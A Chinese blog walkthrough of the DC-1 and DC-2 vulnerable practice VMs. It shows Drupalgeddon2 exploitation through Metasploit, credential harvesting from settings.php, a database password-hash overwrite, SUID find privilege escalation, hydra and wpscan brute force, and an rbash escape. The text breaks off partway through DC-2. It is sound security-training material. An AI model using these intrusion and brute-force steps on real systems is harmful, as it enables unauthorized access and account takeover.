<!DOCTYPE HTML>
<html lang="">


<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    <meta name="keywords" content="DC-1至DC-4靶机渗透测试, Knlvre">
    <meta name="description" content="前言由于网络环境的变化，攻击机和靶机的IP可能发生改变。在每道题目中如果有改变，我会在开头的环境中写出来
DC-1环境虚拟机平台：VMware Workstation Pro
攻击机：Kali（IP：192.168.43.84）
靶机：DC">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title>DC-1至DC-4靶机渗透测试 | Knlvre</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/css/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">
    <style type="text/css">
        
    </style>

    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
</head>


<body>

<header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="container">
            <div class="nav-wrapper">
                <div class="brand-logo">
                    <a href="knlvre.github.io/" class="waves-effect waves-light">
                        
                        <img src="/medias/logo.png" class="logo-img hide-on-small-only">
                        
                        <span class="logo-span">Knlvre</span>
                    </a>
                </div>
                

<a href="#" data-activates="mobile-nav" class="button-collapse"><i class="fa fa-navicon"></i></a>
<ul class="right">
    
    <li class="hide-on-med-and-down">
        <a href="/" class="waves-effect waves-light">
            
            <i class="fa fa-home"></i>
            
            <span>Index</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/tags" class="waves-effect waves-light">
            
            <i class="fa fa-tags"></i>
            
            <span>Tags</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/categories" class="waves-effect waves-light">
            
            <i class="fa fa-bookmark"></i>
            
            <span>Categories</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/archives" class="waves-effect waves-light">
            
            <i class="fa fa-archive"></i>
            
            <span>Archives</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/about" class="waves-effect waves-light">
            
            <i class="fa fa-user-circle-o"></i>
            
            <span>About</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/friends" class="waves-effect waves-light">
            
            <i class="fa fa-address-book"></i>
            
            <span>Friends</span>
        </a>
    </li>
    
    <li>
        <a id="toggleSearch" class="waves-effect waves-light">
            <i id="searchIcon" class="mdi-action-search" title="Search"></i>
        </a>
    </li>

</ul>

<div class="side-nav" id="mobile-nav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Knlvre</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li>
            <a href="/" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-home"></i>
                
                Index
            </a>
        </li>
        
        <li>
            <a href="/tags" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-tags"></i>
                
                Tags
            </a>
        </li>
        
        <li>
            <a href="/categories" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-bookmark"></i>
                
                Categories
            </a>
        </li>
        
        <li>
            <a href="/archives" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-archive"></i>
                
                Archives
            </a>
        </li>
        
        <li>
            <a href="/about" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-user-circle-o"></i>
                
                About
            </a>
        </li>
        
        <li>
            <a href="/friends" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-address-book"></i>
                
                Friends
            </a>
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fa fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>

    <div class="social-link">


    <a href="mailto:xxx@xx.xx" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fa fa-envelope-open"></i>
    </a>



    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=123123123" class="tooltipped" data-tooltip="QQ联系我: 123123123" data-position="top" data-delay="50">
        <i class="fa fa-qq"></i>
    </a>


</div>
</div>

            </div>
        </div>

        
        <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>
</header>





<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
    <div class="container">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <div class="description center-align post-title">
                        DC-1至DC-4靶机渗透测试
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>



<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        margin: 35px 0 15px 0;
        padding-left: 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #toc-content .is-active-link::before {
        background-color: #42b983;
    }
</style>
<div class="row">
    <div class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="knlvre.github.io/tags/渗透测试/" target="_blank">
                                <span class="chip bg-color">渗透测试</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                <div class="post-date info-break-policy">
                    <i class="fa fa-calendar-minus-o fa-fw"></i>Publish Date:&nbsp;&nbsp;
                    2019-09-17
                </div>

                
				
				
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="fa fa-eye fa-fw"></i>Read Count:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">
        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于网络环境的变化，攻击机和靶机的IP可能发生改变。在每道题目中如果有改变，我会在开头的环境中写出来</p>
<h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>虚拟机平台：VMware Workstation Pro</p>
<p>攻击机：Kali（IP：192.168.43.84）</p>
<p>靶机：DC-1（IP：192.168.43.27）</p>
<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>打开DC1靶机之后，需要输入登录的账号和密码，但是却不知道</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-1.png" alt="1-1"></p>
<p>由于IP也不知道，所以没有目标下手，所以需要获取靶机的IP地址。Kali上使用<code>Nmap</code>扫描本网段下的所有主机</p>
<p>先查看Kali所处的网段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-2.png" alt="1-2"></p>
<p>Nmap通过Ping方法扫描网段内所有主机，排除掉其他IP，找到目标靶机（192.168.43.27）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.43.0/24</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-3.png" alt="1-3"></p>
<p>扫描主机开放的端口</p>
<p>Ps：-sV，版本探测。版本探测不是进行端口扫描，而是通过相应的端口对应的服务，根据服务指纹识别出相应的版本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.43.27</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-4.png" alt="1-4"></p>
<p>既然开放了<code>http服务的80端口</code>，那现在就直接用浏览器访问一下</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-5.png" alt="1-5"></p>
<p>发现是典型的<code>Drupal Site</code>，那就可以启动<code>Metersploit</code>来帮助渗透</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-6.png" alt="1-6"></p>
<p>搜索<code>drupal</code>的模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search drupal</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-7.png" alt="1-7"></p>
<p>使用2018-03-28的测试，成功</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">set rhosts 192.168.43.27</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-8.png" alt="1-8"></p>
<p>获取<code>shell</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-9.png" alt="1-9"></p>
<p>使用<code>Python</code>反弹回一个交互式shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-10.png" alt="1-10"></p>
<p>在当前目录下（网页根目录<code>/var/www/</code>）发现<code>flag1.txt</code>，查看后给出提示：</p>
<blockquote>
<p>Every good CMS needs a config file - and so do you.</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-11.png" alt="1-11"></p>
<p>既然提示我们<code>网站配置文件</code>，那就到<code>/var/www/sites/default</code>目录下，查看<code>cat settings.php</code>文件，发现了<code>flag2</code></p>
<p>并且提示：</p>
<blockquote>
<p>Brute force and dictionary attacks aren’t the only ways to gain access (and you WILL need access).What can you do with these credentials?</p>
</blockquote>
<p>大意应该就是我们能用当前配置文件下的信息做一些什么呢？注意到提示下面有数据库的账号密码，所以我们可以拿着这个去登录数据库</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-12.png" alt="1-12"></p>
<p>尝试登录数据库，成功</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u dbuser -p</span><br><span class="line">R0ck3t</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-13.png" alt="1-13"></p>
<p>查看<code>drupal库-users表</code>，发现了admin的账号密码，但是密码经过加密</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-14.png" alt="1-14"></p>
<p>现在可以选择修改掉admin的密码，但是密码经过特殊算法加密，如果不按照它的加密规则修改，查询的时候还是会不正确，所以就必须按照加密规则加密然后去修改。参考文章：<a href="http://drupalchina.cn/node/2128" target="_blank" rel="noopener">http://drupalchina.cn/node/2128</a></p>
<p>退出数据库，切换到网站根目录下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\q</span><br><span class="line">cd /var/www</span><br><span class="line">php scripts/password-hash.sh [123456]</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-15.png" alt="1-15"></p>
<p>再次进入数据库，将刚才返回的<code>hash值</code>拿去替换为<code>admin</code>的密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">update users set pass=&quot;$S$DpO/2yRe.nB1y8WswwIgYPp/hxooDcHaPXrEW33ERy9o5ox2jLwa&quot; where name=&quot;admin&quot;;</span><br><span class="line">select * from users;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-16.png" alt="1-16"></p>
<p>更改完后，现在用户admin的密码就变为123456了，回到网站中尝试登陆，果然成功了</p>
<p>并且在<code>Dashboard</code>模块找到了<code>flag3</code>，提示：</p>
<blockquote>
<p>Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-17.png" alt="1-17"></p>
<p>flag3提示我们<code>提权（PERMS）</code>、<code>FIND命令</code>、<code>-exec</code>。既然涉及到提权，那么下一个flag应该是需要相应的权限才能查看，可以搜索一下flag关键字</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;flag*&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-18.png" alt="1-18"></p>
<p>找到了<code>/home/flag4</code>目录下的<code>flag4.txt</code>，查看后给出了提示：</p>
<blockquote>
<p>Can you use this same method to find or access the flag in root? Probably. But perhaps it’s not that easy.  Or maybe it is?</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-19.png" alt="1-19"></p>
<p>提示我们<code>/root</code>下有下一个flag，但是尝试进入时，被拒绝了，只有<code>root</code>能访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">cd /</span><br><span class="line">ls -l</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-20.png" alt="1-20"></p>
<p>现在就需要<code>提权</code>了，根据flag3的提示，本次使用具有<code>SUID</code>的命令来提权，先找一下具有<code>SUID（4000）</code>权限的命令，可以发现find命令就有<code>4000</code>权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-21.png" alt="1-21"></p>
<p>现在就可以利用<code>find命令</code>来提权，直接获得<code>root</code>权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www</span><br><span class="line">touch ti_quan</span><br><span class="line">find / -name ti_quan -exec &quot;whoami&quot; \;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-22.png" alt="1-22"></p>
<p>弹出root权限的shell，查看<code>/root</code>下的flag了</p>
<p>Ps：注意此处<code>&quot;/bin/sh&quot;</code>才会是<code>root</code>权限，如果换成<code>&quot;/bin/bash&quot;</code>就还会是<code>www-data</code>权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -name ti_quan -exec &quot;/bin/sh&quot; \;</span><br><span class="line">cd \root</span><br><span class="line">cat thefinalflag.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-23.png" alt="1-23"></p>
<p>看了参考的文章，知道本靶机还有一个玩法，就是用<code>hydra</code>去爆破flag4用户的密码，先介绍参数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-l [指定用户名]</span><br><span class="line">-P [加载自定义的密码字典]</span><br><span class="line">ssh://[ip] 指定使用的协议和IP</span><br></pre></td></tr></table></figure>
<p>先自己创建<code>password.txt</code>，然后使用hydra（由于我换了网络，所以IP改一下）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l flag4 -P password.txt ssh://192.168.43.27</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-24.png" alt="1-24"></p>
<p>爆破出密码为<code>orange</code>，用ssh去连接登录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh flag4@192.168.43.27</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-25.png" alt="1-25"></p>
<h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><h2 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h2><p>虚拟机平台：VMware Workstation Pro</p>
<p>攻击机：Kali（IP：192.168.43.84或192.168.2.107）</p>
<p>靶机：DC-2（IP：192.168.43.10或192.168.2.109）</p>
<h2 id="渗透测试-1"><a href="#渗透测试-1" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>打开DC2靶机之后，照样利用<code>Nmap</code>扫描攻击机的网段，找到DC2的IP地址之后，扫描DC2的端口开放情况</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.43.0/24</span><br><span class="line">nmap -sV 192.168.43.10</span><br></pre></td></tr></table></figure>
<p>扫描结果显示开放80端口，但是访问时却访问不了，用<code>-A</code>选项扫一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.43.10</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-12.png" alt="2-12"></p>
<p>修改hosts文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/hosts</span><br><span class="line">cat /etc/hosts</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-13.png" alt="2-13"></p>
<p>再次浏览器访问，发现是<code>WordPress</code>的站，并且发现<code>flag1</code>，提示：</p>
<blockquote>
<p>Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</p>
<p>More passwords is always better, but sometimes you just can’t win them all.</p>
<p>Log in as one to see the next flag.</p>
<p>If you can’t find it, log in as another.</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-1.png" alt="2-1"></p>
<p>根据提示的内容，应该是要我们去获取后台的用户和密码</p>
<p>首先，用Kali内的工具<code>wpscan（WordPress漏洞扫描器）</code>获取用户名</p>
<p>Ps：<code>-e u</code>作用是枚举用户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -e u</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-2.png" alt="2-2"></p>
<p>从扫描结果可以看出来，一共扫描出三个用户：<code>admin</code>、<code>jerry</code>、<code>tom</code>。创建文本<code>dc2_users.txt</code>，将三个用户写入其中</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-3.png" alt="2-3"></p>
<p>接下来，使用Kali内的工具<code>cewl</code>扫描网站，获取可能的密码</p>
<p>Ps：<code>-w</code>参数用来将扫描结果输出到文件内</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2/ -w dc2_passwords.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-4.png" alt="2-4"></p>
<p>现在有了用户名和密码，可以利用刚才生成的<code>dc2_users.txt</code>和<code>dc2_passwords.txt</code>去爆破。有两种方法：1.wpscan 2.hydra</p>
<p>方法一：wpscan</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -U dc2_users -P dc2_passwords.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-5.png" alt="2-5"></p>
<p>方法二：hydra</p>
<p>由于hydra不行wpscan是专门针对WordPress的漏洞扫描工具，所以需要提供登录的页面<code>（wp-login.php）</code>、提交表单的方式<code>（POST）</code>以及表单的数据<code>（log、pwd等等）</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-6.png" alt="2-6"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L dc2_users.txt -P dc2_passwords.txt dc-2 http-form-post &apos;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&apos;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-7.png" alt="2-7"></p>
<p>现在得到了<code>jerry</code>和<code>tom</code>的用户名和密码，登录<code>jerry</code>账户，拿到了<code>flag2</code>，提示：</p>
<blockquote>
<p>If you can’t exploit WordPress and take a shortcut, there is another way.</p>
<p>Hope you found another entry point.</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-8.png" alt="2-8"></p>
<p>重新扫描靶机的所有端口，扫到7744端口（raqmon-pdu）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p1-65535 192.168.43.10</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-9.png" alt="2-9"></p>
<p>ssh连接，tom的账号</p>
<p>Ps：由于这里端口不是22号端口，所以需要指定端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@192.168.43.10 -p 7744</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-10.png" alt="2-10"></p>
<p>连接成功，但是碰到了<code>rbash (restricited Bash)</code>，许多命令都被禁用了</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-11.png" alt="2-11"></p>
<p>用vi命令绕过受限的shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi flag3.txt</span><br><span class="line">:set shell=/bin/bash</span><br><span class="line">:shell</span><br><span class="line">export -p</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-14.png" alt="2-14"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># export PATH=$PATH:/bin/</span></span><br><span class="line"><span class="comment"># export -p</span></span><br><span class="line"></span><br><span class="line">tom@DC-2:~$ <span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin/</span><br><span class="line">tom@DC-2:~$ <span class="built_in">export</span> -p</span><br><span class="line"><span class="built_in">declare</span> -x HOME=<span class="string">"/home/tom"</span></span><br><span class="line"><span class="built_in">declare</span> -x LANG=<span class="string">"en_US.UTF-8"</span></span><br><span class="line"><span class="built_in">declare</span> -x LOGNAME=<span class="string">"tom"</span></span><br><span class="line"><span class="built_in">declare</span> -x MAIL=<span class="string">"/var/mail/tom"</span></span><br><span class="line"><span class="built_in">declare</span> -x OLDPWD</span><br><span class="line"><span class="built_in">declare</span> -x PATH=<span class="string">"/home/tom/usr/bin:/bin/"</span>	<span class="comment">#此处加入了/bin/</span></span><br><span class="line"><span class="built_in">declare</span> -x PWD=<span class="string">"/home/tom"</span></span><br><span class="line"><span class="built_in">declare</span> -x SHELL=<span class="string">"/bin/rbash"</span></span><br><span class="line"><span class="built_in">declare</span> -x SHLVL=<span class="string">"2"</span></span><br><span class="line"><span class="built_in">declare</span> -x SSH_CLIENT=<span class="string">"192.168.2.107 45502 7744"</span></span><br><span class="line"><span class="built_in">declare</span> -x SSH_CONNECTION=<span class="string">"192.168.2.107 45502 192.168.2.109 7744"</span></span><br><span class="line"><span class="built_in">declare</span> -x SSH_TTY=<span class="string">"/dev/pts/0"</span></span><br><span class="line"><span class="built_in">declare</span> -x TERM=<span class="string">"xterm-256color"</span></span><br><span class="line"><span class="built_in">declare</span> -x USER=<span class="string">"tom"</span></span><br><span class="line"><span class="built_in">declare</span> -x VIM=<span class="string">"/usr/share/vim"</span></span><br><span class="line"><span class="built_in">declare</span> -x 